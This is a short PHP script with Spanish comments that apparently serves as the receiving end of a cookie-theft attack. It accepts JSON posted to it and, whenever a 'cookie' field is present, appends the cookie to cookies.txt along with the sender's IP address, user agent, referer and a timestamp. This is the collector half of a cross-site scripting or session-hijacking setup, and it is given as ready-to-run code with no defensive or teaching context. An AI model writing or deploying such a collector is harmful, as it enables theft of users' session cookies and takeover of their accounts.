<?php
// Recibir los datos JSON
$json_data = file_get_contents('php://input');
$data = json_decode($json_data, true);

if (isset($data['cookie'])) {
    // Guardar la cookie en cookies.txt
    $cookie = $data['cookie'];
    $fecha = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Desconocido';
    
    $contenido = "Fecha: $fecha\nIP: $ip\nUser-Agent: $user_agent\nReferer: $referer\nCookie: $cookie\n\n";
    
    // Guardar en el archivo
    file_put_contents('cookies.txt', $contenido, FILE_APPEND);
    
    // Responder con éxito
    header('Content-Type: application/json');
    echo json_encode(['success' => true]);
} else {
    // Responder con error
    header('Content-Type: application/json');
    echo json_encode(['success' => false, 'error' => 'No cookie data provided']);
}
?>